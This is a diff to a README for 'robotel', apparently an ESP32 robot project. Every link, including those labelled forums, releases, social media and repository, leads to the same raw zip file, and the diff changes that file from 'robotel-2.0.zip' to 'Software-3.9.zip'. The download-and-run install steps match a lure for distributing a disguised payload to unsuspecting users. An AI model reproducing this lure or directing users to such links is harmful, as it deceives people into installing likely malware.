@@ -4,7 +4,7 @@
 Welcome to **robotel**, an ESP32-based autonomous robot that integrates voice AI and GPT for self-learning navigation. This innovative technology makes it easy to explore robotics, whether you're a hobbyist or new to the field. 
 
 ## 📦 Download Now
-[![Download Robotel](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip%2300a1f1)](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip)
+[![Download Robotel](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip%2300a1f1)](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
 
 ## 🔍 Features
 - **Self-Learning Navigation:** Robotel adapts to its surroundings, making it smarter over time.
@@ -20,10 +20,10 @@ To run robotel smoothly, ensure you have the following:
 - Basic requirements of 4 GB RAM and 1 GB free disk space.
 
 ## 🔗 Getting Help
-If you need assistance with installation or usage, consider visiting the [community forums](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip) for tutorials and support from other users.
+If you need assistance with installation or usage, consider visiting the [community forums](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip) for tutorials and support from other users.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip) to download the latest version of the robotel software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip) to download the latest version of the robotel software.
 2. Look for the latest release and click on it.
 3. Download the installation file that suits your system (Windows, macOS, or Linux).
 4. Run the downloaded file and follow the installation instructions provided in the setup wizard.
@@ -51,9 +51,9 @@ Your data privacy is a priority. Robotel does not collect personal information w
 
 ## 🌐 Join Us
 Follow us on social media for updates and discussions:
-- [Twitter](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip)
-- [Facebook](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip)
-- [YouTube](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip)
+- [Twitter](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
+- [Facebook](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
+- [YouTube](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
 
 ## 📜 License
 Robotel is open-source software licensed under the MIT License. You can view the license in the repository in the 'LICENSE' file.
@@ -61,6 +61,6 @@ Robotel is open-source software licensed under the MIT License. You can view the
 ## 🙏 Acknowledgements
 Special thanks to the contributors and community members who have supported the development of robotel.
 
-For more information, visit the [repository](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip). Enjoy your journey into the world of autonomous robotics!
+For more information, visit the [repository](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip). Enjoy your journey into the world of autonomous robotics!
 
-[![Download Robotel](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip%2300a1f1)](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/robotel-2.0.zip)
+[![Download Robotel](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip%2300a1f1)](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
